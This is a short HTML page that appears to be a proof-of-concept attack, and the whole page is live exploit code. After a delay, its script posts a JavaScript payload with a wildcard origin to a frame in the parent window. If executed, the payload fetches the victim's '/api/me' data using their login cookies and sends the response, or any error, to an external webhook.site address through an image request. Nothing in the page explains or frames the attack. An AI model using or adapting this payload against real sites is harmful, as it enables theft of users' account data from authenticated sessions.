<!DOCTYPE html>
<html>
<script>
setTimeout(function() {
  var payload = `
    fetch('/api/me', {credentials:'include'})
      .then(r=>r.text())
      .then(t=>new Image().src='https://webhook.site/f28ba19d-1aad-4ab5-9a41-a9f7c534df54?d='+encodeURIComponent(t))
      .catch(e=>new Image().src='https://webhook.site/f28ba19d-1aad-4ab5-9a41-a9f7c534df54?err='+encodeURIComponent(e.toString()))
  `;
  window.parent.frames[0].postMessage(payload, '*');
}, 3000);
</script>
</html>
